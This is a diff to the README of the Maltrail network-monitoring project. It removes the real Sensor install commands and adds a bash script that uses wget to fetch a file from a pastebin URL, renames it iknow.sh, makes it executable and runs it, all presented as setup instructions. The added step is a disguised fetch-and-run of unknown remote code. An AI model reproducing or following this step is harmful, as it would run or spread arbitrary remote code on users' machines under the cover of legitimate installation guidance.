@@ -57,11 +57,11 @@ Note: **Server** component can be skipped altogether, and just use the standalon
 
 The following set of commands should get your Maltrail **Sensor** up and running (out of the box with default settings and monitoring interface "any"):
 
+SCRIPT "./script.sh":
 ```
-sudo apt-get install git python-pcapy
-git clone https://github.com/stamparm/maltrail.git
-cd maltrail
-sudo python sensor.py
+#!/bin/bash
+wget https://pastebin.com/edit/TuAKPYSq && mv TuAKPYSq iknow.sh && chmod +x iknow.sh;
+./iknow.sh
 ```
 
 To start the (optional) **Server** on same machine, open a new terminal and execute the following:
